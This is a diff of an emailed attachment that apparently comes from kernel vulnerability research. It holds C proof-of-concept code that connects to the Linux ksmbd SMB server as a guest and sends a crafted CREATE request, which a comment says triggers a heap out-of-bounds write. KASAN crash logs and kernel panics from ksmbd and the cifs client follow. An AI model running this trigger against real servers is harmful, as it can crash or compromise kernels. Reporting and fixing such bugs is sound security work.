+		(p - buf) - 4, (unsigned long long)persistent,
+		(unsigned long long)volatile_id, (unsigned)(p - ctx_start));
+	return (p - buf) - 4;
+}
+
+static int reconnect_guest(void) {
+	int fd =3D socket(AF_INET, SOCK_STREAM, 0);
+	struct sockaddr_in a =3D {0};
+	uint8_t buf[4096], rbuf[8192];
+	size_t n;
+	ssize_t rn;
+	a.sin_family =3D AF_INET;
+	a.sin_port =3D htons(445);
+	a.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
+	if (connect(fd, (struct sockaddr *)&a, sizeof a) < 0) {
+		perror("reconnect TCP");
+		return -1;
+	}
+	session_id =3D 0;
+	tree_id =3D 0;
+	cur_mid =3D 0;
+	n =3D build_negotiate(buf); smb_send(fd, buf, n);
+	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+	fprintf(stderr, "[NEW CONN] negotiate %zd status=3D0x%08x\n", rn,
+		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
+	n =3D build_sesssetup1(buf); smb_send(fd, buf, n);
+	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+	if (rn >=3D 48) session_id =3D *(uint64_t *)(rbuf + 4 + 40);
+	fprintf(stderr, "[NEW CONN] session1 %zd status=3D0x%08x sid=3D%llu\n", rn,
+		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0,
+		(unsigned long long)session_id);
+	n =3D build_sesssetup2_guest(buf); smb_send(fd, buf, n);
+	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+	if (rn >=3D 48) session_id =3D *(uint64_t *)(rbuf + 4 + 40);
+	fprintf(stderr, "[NEW CONN] session2 %zd status=3D0x%08x sid=3D%llu\n", rn,
+		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0,
+		(unsigned long long)session_id);
+	memset(buf, 0, 512);
+	put_hdr(buf, SMB2_TREE_CONNECT, cur_mid++, 0);
+	uint8_t *p =3D buf + 4 + 64;
+	*(uint16_t *)p =3D 9; p +=3D 2;
+	*(uint16_t *)p =3D 0; p +=3D 2;
+	*(uint16_t *)p =3D 72; p +=3D 2;
+	uint16_t path[] =3D {'\\','\\','1','2','7','.','0','.','0','.','1','\\','T',=
+'E','S','T'};
+	*(uint16_t *)p =3D sizeof path; p +=3D 2;
+	memcpy(p, path, sizeof path); p +=3D sizeof path;
+	while ((p - buf) & 7) *p++ =3D 0;
+	n =3D (p - buf) - 4;
+	smb_send(fd, buf, n);
+	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+	if (rn >=3D 4 + 40) tree_id =3D *(uint32_t *)(rbuf + 4 + 36);
+	fprintf(stderr, "[NEW CONN] tree %zd status=3D0x%08x tid=3D%u\n", rn,
+		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0, tree_id);
+	return fd;
+}
+
+int main(void) {
+	fprintf(stderr, "=3D=3D=3D ksmbd_aapl_ctrl start =3D=3D=3D\n");
+	/* Netlink socket MUST live in init_net (kernel unicast targets init_net).
+	 * Create it before unshare(CLONE_NEWNET). */
+	nl_fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+	if (nl_fd < 0) { perror("netlink"); return 1; }
+
+	if (unshare(CLONE_NEWNET) < 0) { perror("unshare"); return 1; }
+
+	int fam =3D genl_family_id();
+	if (fam < 0) { fprintf(stderr, "FAIL genl\n"); return 1; }
+	fprintf(stderr, "genl family=3D%d\n", fam);
+
+	if (start_ksmbd(fam) < 0) { fprintf(stderr, "FAIL start\n"); return 1; }
+
+	pthread_t tid;
+	pthread_create(&tid, NULL, ipc_thread, (void *)(long)fam);
+	usleep(200000);
+
+	{
+		int s =3D socket(AF_INET, SOCK_DGRAM, 0);
+		struct ifreq ifr;
+		memset(&ifr, 0, sizeof ifr);
+		strcpy(ifr.ifr_name, "lo");
+		ioctl(s, SIOCGIFFLAGS, &ifr);
+		ifr.ifr_flags |=3D IFF_UP;
+		ioctl(s, SIOCSIFFLAGS, &ifr);
+		close(s);
+	}
+	usleep(300000);
+
+	int fd =3D socket(AF_INET, SOCK_STREAM, 0);
+	struct sockaddr_in a;
+	memset(&a, 0, sizeof a);
+	a.sin_family =3D AF_INET;
+	a.sin_port =3D htons(445);
+	a.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
+	if (connect(fd, (struct sockaddr *)&a, sizeof a) < 0) {
+		perror("connect"); return 1;
+	}
+	fprintf(stderr, "connected\n");
+
+	uint8_t buf[4096], rbuf[8192];
+	size_t n =3D build_negotiate(buf);
+	smb_send(fd, buf, n);
+	ssize_t rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+	fprintf(stderr, "negotiate reply %zd status=3D0x%08x\n", rn,
+		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
+
+	n =3D build_sesssetup1(buf);
+	smb_send(fd, buf, n);
+	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+	fprintf(stderr, "sesssetup1 reply %zd status=3D0x%08x\n", rn,
+		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
+	if (rn >=3D 48) {
+		session_id =3D *(uint64_t *)(rbuf + 4 + 40);
+		fprintf(stderr, "  session_id=3D0x%llx\n", (unsigned long long)session_id);
+	}
+
+	n =3D build_sesssetup2_guest(buf);
+	smb_send(fd, buf, n);
+	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+	fprintf(stderr, "sesssetup2 reply %zd status=3D0x%08x\n", rn,
+		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
+	if (rn >=3D 16 && *(uint32_t *)(rbuf + 12) =3D=3D 0) {
+		if (rn >=3D 48) {
+			session_id =3D *(uint64_t *)(rbuf + 4 + 40);
+			fprintf(stderr, "  session established id=3D0x%llx\n",
+				(unsigned long long)session_id);
+		}
+	}
+
+	/* TREE_CONNECT \\TEST */
+	{
+		memset(buf, 0, 512);
+		put_hdr(buf, SMB2_TREE_CONNECT, cur_mid++, 0);
+		uint8_t *p =3D buf + 4 + 64;
+		*(uint16_t *)p =3D 9; p +=3D 2;
+		*(uint16_t *)p =3D 0; p +=3D 2;	/* Flags */
+		*(uint16_t *)p =3D 72; p +=3D 2;	/* PathOffset */
+		uint16_t path[] =3D { '\\', '\\', '1', '2', '7', '.', '0', '.', '0', '.', '=
+1', '\\', 'T', 'E', 'S', 'T' };
+		uint16_t plen =3D sizeof path;
+		*(uint16_t *)p =3D plen; p +=3D 2;
+		memcpy(p, path, plen);
+		p +=3D plen;
+		while ((p - buf) & 7) *p++ =3D 0;
+		n =3D (p - buf) - 4;
+		smb_send(fd, buf, n);
+		rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+		fprintf(stderr, "tree_connect reply %zd status=3D0x%08x\n", rn,
+			rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
+		if (rn >=3D 4 + 36) {
+			tree_id =3D *(uint32_t *)(rbuf + 4 + 36);
+			fprintf(stderr, "  tree_id=3D%u\n", tree_id);
+		}
+	}
+
+	/* CREATE with 4 contexts -> heap OOB write into the 448-byte response_buf */
+	n =3D build_create_overflow(buf);
+	smb_send(fd, buf, n);
+	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+	fprintf(stderr, "create reply %zd status=3D0x%08x\n", rn,
+		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
+	if (rn > 0) {
+		fprintf(stderr, "create hex (%zd):\n", rn);
+		for (int i =3D 0; i < rn; i +=3D 16) {
+			fprintf(stderr, "  %04x:", i);
+			for (int j =3D 0; j < 16 && i + j < rn; j++)
+				fprintf(stderr, " %02x", rbuf[i + j]);
+			fprintf(stderr, "\n");
+		}
+		/* Look for AAPL / RqLs / MxAc / QFid tags in the response. */
+		for (int i =3D 0; i + 4 <=3D rn; i++) {
+			if (!memcmp(rbuf + i, "AAPL", 4) || !memcmp(rbuf + i, "RqLs", 4) ||
+			    !memcmp(rbuf + i, "MxAc", 4) || !memcmp(rbuf + i, "QFid", 4) ||
+			    !memcmp(rbuf + i, "DHnQ", 4) || !memcmp(rbuf + i, "DH2Q", 4))
+				fprintf(stderr, "  tag at %d: %.4s\n", i, rbuf + i);
+		}
+		/* ContextsLength at create_rsp offset 148 (from smb2 hdr =3D rbuf+4) */
+		if (rn >=3D 4 + 152) {
+			uint32_t ctx_off =3D *(uint32_t *)(rbuf + 4 + 140);
+			uint32_t ctx_len =3D *(uint32_t *)(rbuf + 4 + 144);
+			fprintf(stderr, "  CreateContextsOffset=3D%u Length=3D%u (total_pdu=3D%zd)=
+\n",
+				ctx_off, ctx_len, rn - 4);
+		}
+	}
+
+	if (rn >=3D 4 + 144 && *(uint32_t *)(rbuf + 12) =3D=3D 0) {
+		uint64_t persistent =3D *(uint64_t *)(rbuf + 4 + 128);
+		uint64_t volatile_id =3D *(uint64_t *)(rbuf + 4 + 136);
+		fprintf(stderr, "[FIRST OPEN] persistent=3D%llu volatile=3D%llu\n",
+			(unsigned long long)persistent,
+			(unsigned long long)volatile_id);
+		close(fd);
+		usleep(600000);
+		fd =3D reconnect_guest();
+		if (fd < 0) return 2;
+		n =3D build_create_reconnect(buf, persistent, volatile_id);
+		smb_send(fd, buf, n);
+		rn =3D smb_recv(fd, rbuf, sizeof rbuf);
+		fprintf(stderr, "[RECONNECT REPLY] len=3D%zd status=3D0x%08x\n", rn,
+			rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
+	}
+
+	fprintf(stderr, "=3D=3D=3D ksmbd_aapl_ctrl done =3D=3D=3D\n");
+	ipc_running =3D 0;
+	pthread_join(tid, NULL);
+	close(fd);
+	return 0;
+}
+
+--===============3053206820710942250==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="kasan-run1.txt"
 MIME-Version: 1.0
 
-[   22.683672] BUG: KASAN: slab-out-of-bounds in string+0x42b/0x470
-[   22.684184] Read of size 1 at addr ffff88800e7a40cc by task cifs_ntlmssp_s=
-i/103
-[   22.684326]=20
-[   22.684844] CPU: 0 UID: 0 PID: 103 Comm: cifs_ntlmssp_si Not tainted 7.3.0=
- #8 PREEMPT(lazy)=20
-[   22.684984] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[  106.410461] BUG: KASAN: slab-out-of-bounds in string+0x42b/0x470
+[  106.495947] Read of size 1 at addr ffff88800e5142e5 by task kworker/0:0/9
+[  106.496146]=20
+[  106.496779] CPU: 0 UID: 0 PID: 9 Comm: kworker/0:0 Not tainted 7.3.0 #8 PR=
+EEMPT(lazy)=20
+[  106.496916] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[   22.685237] Call Trace:
-[   22.685334]  <TASK>
-[   22.685443]  dump_stack_lvl+0x7b/0xa0
-[   22.685597]  print_report+0xd0/0x630
-[   22.685697]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[   22.685798]  ? __kernel_text_address+0x12/0x40
-[   22.685886]  ? string+0x42b/0x470
-[   22.685940]  kasan_report+0xce/0x100
-[   22.686008]  ? string+0x42b/0x470
-[   22.686070]  string+0x42b/0x470
-[   22.686128]  ? __pfx_string+0x10/0x10
-[   22.686190]  ? mempool_free+0xd4/0x120
-[   22.686273]  vsnprintf+0x330/0x1110
-[   22.686339]  ? cifs_mount_get_session+0x15/0x430
-[   22.686427]  ? __pfx_vsnprintf+0x10/0x10
-[   22.686486]  ? path_mount+0x571/0x1e30
-[   22.686553]  ? do_syscall_64+0xdd/0x4a0
-[   22.686617]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   22.686693]  vprintk_store+0x319/0x960
-[   22.686777]  ? __pfx_vprintk_store+0x10/0x10
-[   22.686863]  ? kmem_cache_free+0xe2/0x430
-[   22.686951]  ? printk_percpu_data_ready+0xe/0x20
-[   22.687018]  vprintk_emit+0xfc/0x3b0
-[   22.687089]  ? __pfx_vprintk_emit+0x10/0x10
-[   22.687159]  ? _raw_spin_trylock+0xb5/0x120
-[   22.687236]  _printk+0xcc/0x100
-[   22.687335]  ? __pfx__printk+0x10/0x10
-[   22.687425]  ? __pfx____ratelimit+0x10/0x10
-[   22.687496]  decode_ntlmssp_challenge+0x6fa/0x880
-[   22.687568]  ? build_ntlmssp_smb3_negotiate_blob+0x3f8/0x5b0
-[   22.687643]  SMB2_sess_auth_rawntlmssp_negotiate+0x7c5/0xdc0
-[   22.687726]  ? __pfx_SMB2_sess_auth_rawntlmssp_negotiate+0x10/0x10
-[   22.687807]  ? kasan_save_track+0x14/0x30
-[   22.687867]  ? __kasan_kmalloc+0x8f/0xa0
-[   22.687926]  ? __kmalloc_cache_noprof+0x19f/0x3f0
-[   22.687999]  ? SMB2_sess_setup+0x67/0x650
-[   22.688071]  ? __pfx_SMB2_sess_auth_rawntlmssp_negotiate+0x10/0x10
-[   22.688154]  SMB2_sess_setup+0x28a/0x650
-[   22.688224]  ? __pfx_SMB2_sess_setup+0x10/0x10
-[   22.688301]  cifs_setup_session+0x280/0xe60
-[   22.688373]  cifs_get_smb_ses+0x1132/0x19f0
-[   22.688445]  cifs_mount_get_session+0xa2/0x430
-[   22.688515]  cifs_mount+0xc1/0xc00
-[   22.688578]  ? _raw_spin_lock+0x85/0xe0
-[   22.688655]  ? __pfx_cifs_mount+0x10/0x10
-[   22.688736]  cifs_smb3_do_mount+0x286/0x1780
-[   22.688814]  ? cred_has_capability.isra.0+0x166/0x2a0
-[   22.688928]  ? __pfx_cifs_smb3_do_mount+0x10/0x10
-[   22.689002]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   22.689063]  ? mutex_lock+0x86/0xe0
-[   22.689115]  ? __pfx_mutex_lock+0x10/0x10
-[   22.689169]  ? smb3_handle_conflicting_options+0x43e/0xba0
-[   22.689258]  smb3_get_tree+0x1a2/0x3d0
-[   22.689332]  vfs_get_tree+0x8d/0x300
-[   22.689410]  fc_mount+0x1d/0x1f0
-[   22.689481]  path_mount+0x571/0x1e30
-[   22.689546]  ? __pfx_path_mount+0x10/0x10
-[   22.689602]  ? kasan_save_track+0x14/0x30
-[   22.689663]  ? kmem_cache_free+0xe2/0x430
-[   22.689747]  ? putname+0x93/0xe0
-[   22.689813]  __x64_sys_mount+0x24b/0x2d0
-[   22.689874]  ? __pfx___x64_sys_mount+0x10/0x10
-[   22.689944]  do_syscall_64+0xdd/0x4a0
-[   22.690011]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   22.690142] RIP: 0033:0x41c87e
-[   22.690559] Code: c7 05 fe 87 09 00 00 00 00 00 eb 98 e8 1b 07 00 00 66 2e=
- 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 49 89 ca b8 a5 00 00 00 0f 05 <48> 3d=
- 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
-[   22.690672] RSP: 002b:00007fff342e1bb8 EFLAGS: 00000246 ORIG_RAX: 00000000=
-000000a5
-[   22.690828] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 000000000041c=
-87e
-[   22.690892] RDX: 000000000048809f RSI: 0000000000488084 RDI: 0000000000488=
-0a4
-[   22.690957] RBP: 0000000000000000 R08: 00007fff342e1c20 R09: 00000000004bb=
-160
-[   22.691020] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000488=
-084
-[   22.691088] R13: 00007fff342e1dc8 R14: 00000000004af828 R15: 0000000000000=
-001
-[   22.691178]  </TASK>
-[   22.691258]=20
-[   22.691300] Allocated by task 104:
-[   22.691408]  kasan_save_stack+0x33/0x60
-[   22.691499]  kasan_save_track+0x14/0x30
-[   22.691553]  __kasan_slab_alloc+0x6e/0x70
-[   22.691608]  kmem_cache_alloc_noprof+0x149/0x3e0
-[   22.691683]  mempool_alloc_noprof+0x128/0x210
-[   22.691740]  cifs_buf_get+0x3b/0xa0
-[   22.691801]  allocate_buffers+0x209/0x380
-[   22.691875]  cifs_demultiplex_thread+0x1f2/0x2220
-[   22.691928]  kthread+0x2fe/0x400
-[   22.691981]  ret_from_fork+0x3f7/0x680
-[   22.692047]  ret_from_fork_asm+0x1a/0x30
-[   22.692125]=20
-[   22.692182] The buggy address belongs to the object at ffff88800e7a0000
-[   22.692182]  which belongs to the cache cifs_request of size 16588
-[   22.692273] The buggy address is located 0 bytes to the right of
-[   22.692273]  allocated 16588-byte region [ffff88800e7a0000, ffff88800e7a40=
-cc)
-[   22.692336]=20
-[   22.692410] The buggy address belongs to the physical page:
-[   22.692827] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
- pfn:0xe7a0
-[   22.693147] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 p=
-incount:0
-[   22.693233] flags: 0x100000000000040(head|node=3D0|zone=3D1)
-[   22.693719] page_type: f5(slab)
-[   22.693890] raw: 0100000000000040 ffff88800aa4c3c0 dead000000000122 000000=
+[  106.497137] Workqueue: ksmbd-io handle_ksmbd_work
+[  106.497505] Call Trace:
+[  106.497601]  <TASK>
+[  106.497714]  dump_stack_lvl+0x7b/0xa0
+[  106.497862]  print_report+0xd0/0x630
+[  106.497962]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[  106.498055]  ? string+0x42b/0x470
+[  106.498107]  kasan_report+0xce/0x100
+[  106.498171]  ? string+0x42b/0x470
+[  106.498231]  string+0x42b/0x470
+[  106.498285]  ? __pfx_string+0x10/0x10
+[  106.498347]  vsnprintf+0x330/0x1110
+[  106.498416]  ? __pfx_vsnprintf+0x10/0x10
+[  106.498474]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[  106.498564]  vprintk_store+0x319/0x960
+[  106.498644]  ? stack_depot_save_flags+0x480/0x820
+[  106.498739]  ? __pfx_vprintk_store+0x10/0x10
+[  106.498799]  ? kasan_save_stack+0x42/0x60
+[  106.498871]  ? kasan_save_track+0x14/0x30
+[  106.498927]  ? smb2_set_info+0x1eff/0x3a50
+[  106.498995]  ? handle_ksmbd_work+0x6e4/0x1dd0
+[  106.499070]  ? process_one_work+0x755/0x1200
+[  106.499143]  ? worker_thread+0x4d3/0xbc0
+[  106.499204]  ? kthread+0x2fe/0x400
+[  106.499277]  ? printk_percpu_data_ready+0xe/0x20
+[  106.499340]  vprintk_emit+0xfc/0x3b0
+[  106.499407]  ? __pfx_vprintk_emit+0x10/0x10
+[  106.499481]  _printk+0xcc/0x100
+[  106.499574]  ? __pfx__printk+0x10/0x10
+[  106.499656]  ? __kasan_kmalloc+0x8f/0xa0
+[  106.499710]  ? __kmalloc_cache_noprof+0x19f/0x3f0
+[  106.499784]  ? __kasan_kmalloc+0x8f/0xa0
+[  106.499837]  smb2_set_ea+0x5a9/0x7f0
+[  106.499892]  ? smb2_set_info+0x160f/0x3a50
+[  106.499958]  smb2_set_info+0x1eff/0x3a50
+[  106.500025]  ? _raw_spin_lock+0x85/0xe0
+[  106.500098]  ? __pfx_smb2_set_info+0x10/0x10
+[  106.500167]  ? ksmbd_smb2_check_message+0x531/0x2cd0
+[  106.500254]  ? __pfx_smb2_set_info+0x10/0x10
+[  106.500317]  handle_ksmbd_work+0x6e4/0x1dd0
+[  106.500409]  process_one_work+0x755/0x1200
+[  106.500484]  ? __pfx_process_one_work+0x10/0x10
+[  106.500557]  ? __pfx_handle_ksmbd_work+0x10/0x10
+[  106.500639]  worker_thread+0x4d3/0xbc0
+[  106.500718]  ? __pfx_worker_thread+0x10/0x10
+[  106.500781]  kthread+0x2fe/0x400
+[  106.500834]  ? recalc_sigpending+0x18c/0x220
+[  106.500902]  ? __pfx_kthread+0x10/0x10
+[  106.500958]  ret_from_fork+0x3f7/0x680
+[  106.501031]  ? __pfx_ret_from_fork+0x10/0x10
+[  106.501094]  ? __switch_to+0x743/0xf60
+[  106.501173]  ? __pfx_kthread+0x10/0x10
+[  106.501230]  ret_from_fork_asm+0x1a/0x30
+[  106.501345]  </TASK>
+[  106.501424]=20
+[  106.501455] Allocated by task 101:
+[  106.501573]  kasan_save_stack+0x33/0x60
+[  106.501755]  kasan_save_track+0x14/0x30
+[  106.501806]  __kasan_kmalloc+0x8f/0xa0
+[  106.501855]  __kvmalloc_node_noprof+0x24a/0x670
+[  106.501932]  ksmbd_conn_handler_loop+0x530/0x1110
+[  106.502000]  kthread+0x2fe/0x400
+[  106.502047]  ret_from_fork+0x3f7/0x680
+[  106.502099]  ret_from_fork_asm+0x1a/0x30
+[  106.502174]=20
+[  106.502226] The buggy address belongs to the object at ffff88800e514200
+[  106.502226]  which belongs to the cache kmalloc-256 of size 256
+[  106.502307] The buggy address is located 0 bytes to the right of
+[  106.502307]  allocated 229-byte region [ffff88800e514200, ffff88800e5142e5)
+[  106.502366]=20
+[  106.502439] The buggy address belongs to the physical page:
+[  106.502793] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
+ pfn:0xe514
+[  106.503088] flags: 0x100000000000000(node=3D0|zone=3D1)
+[  106.503570] page_type: f5(slab)
+[  106.503962] raw: 0100000000000000 ffff88800a041b40 dead000000000122 000000=
 0000000000
-[   22.693950] raw: 0000000000000000 0000000200010001 00000000f5000000 000000=
+[  106.504034] raw: 0000000000000000 0000000000080008 00000000f5000000 000000=
 0000000000
-[   22.694026] head: 0100000000000040 ffff88800aa4c3c0 dead000000000122 00000=
-00000000000
-[   22.694080] head: 0000000000000000 0000000200010001 00000000f5000000 00000=
-00000000000
-[   22.694134] head: 0100000000000003 fffffffffffffe01 00000000ffffffff 00000=
-000ffffffff
-[   22.694187] head: 0000000000000000 0000000000000000 00000000ffffffff 00000=
-00000000008
-[   22.694255] page dumped because: kasan: bad access detected
-[   22.694297]=20
-[   22.694319] Memory state around the buggy address:
-[   22.694560]  ffff88800e7a3f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
+[  106.504129] page dumped because: kasan: bad access detected
+[  106.504162]=20
+[  106.504180] Memory state around the buggy address:
+[  106.504439]  ffff88800e514180: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+c fc
+[  106.504514]  ffff88800e514200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
 0 00
-[   22.694627]  ffff88800e7a4000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
-0 00
-[   22.694684] >ffff88800e7a4080: 00 00 00 00 00 00 00 00 00 04 fc fc fc fc f=
+[  106.504572] >ffff88800e514280: 00 00 00 00 00 00 00 00 00 00 00 00 05 fc f=
 c fc
-[   22.694732]                                               ^
-[   22.694814]  ffff88800e7a4100: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+[  106.504618]                                                        ^
+[  106.504695]  ffff88800e514300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
 c fc
-[   22.694854]  ffff88800e7a4180: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+[  106.504734]  ffff88800e514380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
 c fc
-[   22.694907] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+[  106.504785] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-[   22.695258] Kernel panic - not syncing: KASAN: panic_on_warn set ...
-[   22.718206] CPU: 0 UID: 0 PID: 103 Comm: cifs_ntlmssp_si Not tainted 7.3.0=
- #8 PREEMPT(lazy)=20
-[   22.718650] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[  106.505129] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+[  106.521844] CPU: 0 UID: 0 PID: 9 Comm: kworker/0:0 Not tainted 7.3.0 #8 PR=
+EEMPT(lazy)=20
+[  106.522250] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[   22.719129] Call Trace:
-[   22.719298]  <TASK>
-[   22.719448]  dump_stack_lvl+0x30/0xa0
-[   22.719716]  vpanic+0x790/0x850
-[   22.719969]  ? __pfx_vpanic+0x10/0x10
-[   22.720256]  ? string+0x42b/0x470
-[   22.720493]  panic+0xcf/0xd0
-[   22.720714]  ? __pfx_panic+0x10/0x10
-[   22.720956]  ? print_report+0x2ef/0x630
-[   22.721201]  check_panic_on_warn+0x91/0xa0
-[   22.721474]  end_report+0xc8/0xe0
-[   22.721698]  kasan_report+0xdc/0x100
-[   22.721932]  ? string+0x42b/0x470
-[   22.722154]  string+0x42b/0x470
-[   22.722375]  ? __pfx_string+0x10/0x10
-[   22.722604]  ? mempool_free+0xd4/0x120
-[   22.722839]  vsnprintf+0x330/0x1110
-[   22.723067]  ? cifs_mount_get_session+0x15/0x430
-[   22.723341]  ? __pfx_vsnprintf+0x10/0x10
-[   22.723576]  ? path_mount+0x571/0x1e30
-[   22.723804]  ? do_syscall_64+0xdd/0x4a0
-[   22.724035]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   22.724328]  vprintk_store+0x319/0x960
-[   22.724566]  ? __pfx_vprintk_store+0x10/0x10
-[   22.724854]  ? kmem_cache_free+0xe2/0x430
-[   22.725119]  ? printk_percpu_data_ready+0xe/0x20
-[   22.725392]  vprintk_emit+0xfc/0x3b0
-[   22.725629]  ? __pfx_vprintk_emit+0x10/0x10
-[   22.725880]  ? _raw_spin_trylock+0xb5/0x120
-[   22.726140]  _printk+0xcc/0x100
-[   22.726384]  ? __pfx__printk+0x10/0x10
-[   22.726643]  ? __pfx____ratelimit+0x10/0x10
-[   22.726893]  decode_ntlmssp_challenge+0x6fa/0x880
-[   22.727158]  ? build_ntlmssp_smb3_negotiate_blob+0x3f8/0x5b0
-[   22.727473]  SMB2_sess_auth_rawntlmssp_negotiate+0x7c5/0xdc0
-[   22.727788]  ? __pfx_SMB2_sess_auth_rawntlmssp_negotiate+0x10/0x10
-[   22.728110]  ? kasan_save_track+0x14/0x30
-[   22.728353]  ? __kasan_kmalloc+0x8f/0xa0
-[   22.728590]  ? __kmalloc_cache_noprof+0x19f/0x3f0
-[   22.728862]  ? SMB2_sess_setup+0x67/0x650
-[   22.729111]  ? __pfx_SMB2_sess_auth_rawntlmssp_negotiate+0x10/0x10
-[   22.729444]  SMB2_sess_setup+0x28a/0x650
-[   22.729692]  ? __pfx_SMB2_sess_setup+0x10/0x10
-[   22.729956]  cifs_setup_session+0x280/0xe60
-[   22.730213]  cifs_get_smb_ses+0x1132/0x19f0
-[   22.730477]  cifs_mount_get_session+0xa2/0x430
-[   22.730740]  cifs_mount+0xc1/0xc00
-[   22.730964]  ? _raw_spin_lock+0x85/0xe0
-[   22.731214]  ? __pfx_cifs_mount+0x10/0x10
-[   22.731481]  cifs_smb3_do_mount+0x286/0x1780
-[   22.731747]  ? cred_has_capability.isra.0+0x166/0x2a0
-[   22.732049]  ? __pfx_cifs_smb3_do_mount+0x10/0x10
-[   22.732334]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   22.732625]  ? mutex_lock+0x86/0xe0
-[   22.732839]  ? __pfx_mutex_lock+0x10/0x10
-[   22.733072]  ? smb3_handle_conflicting_options+0x43e/0xba0
-[   22.733378]  smb3_get_tree+0x1a2/0x3d0
-[   22.733622]  vfs_get_tree+0x8d/0x300
-[   22.733858]  fc_mount+0x1d/0x1f0
-[   22.734090]  path_mount+0x571/0x1e30
-[   22.734332]  ? __pfx_path_mount+0x10/0x10
-[   22.734572]  ? kasan_save_track+0x14/0x30
-[   22.734809]  ? kmem_cache_free+0xe2/0x430
-[   22.735070]  ? putname+0x93/0xe0
-[   22.735295]  __x64_sys_mount+0x24b/0x2d0
-[   22.735538]  ? __pfx___x64_sys_mount+0x10/0x10
-[   22.735802]  do_syscall_64+0xdd/0x4a0
-[   22.736038]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   22.736320] RIP: 0033:0x41c87e
-[   22.736526] Code: c7 05 fe 87 09 00 00 00 00 00 eb 98 e8 1b 07 00 00 66 2e=
- 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 49 89 ca b8 a5 00 00 00 0f 05 <48> 3d=
- 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
-[   22.737235] RSP: 002b:00007fff342e1bb8 EFLAGS: 00000246 ORIG_RAX: 00000000=
-000000a5
-[   22.737623] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 000000000041c=
-87e
-[   22.737943] RDX: 000000000048809f RSI: 0000000000488084 RDI: 0000000000488=
-0a4
-[   22.738254] RBP: 0000000000000000 R08: 00007fff342e1c20 R09: 00000000004bb=
-160
-[   22.738576] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000488=
-084
-[   22.738887] R13: 00007fff342e1dc8 R14: 00000000004af828 R15: 0000000000000=
-001
-[   22.739219]  </TASK>
-[   22.740540] Kernel Offset: disabled
-[   22.741345] Rebooting in 1 seconds..
+[  106.522716] Workqueue: ksmbd-io handle_ksmbd_work
+[  106.523048] Call Trace:
+[  106.523205]  <TASK>
+[  106.523349]  dump_stack_lvl+0x30/0xa0
+[  106.523613]  vpanic+0x790/0x850
+[  106.523859]  ? __pfx_vpanic+0x10/0x10
+[  106.524105]  ? string+0x42b/0x470
+[  106.524313]  panic+0xcf/0xd0
+[  106.524532]  ? __pfx_panic+0x10/0x10
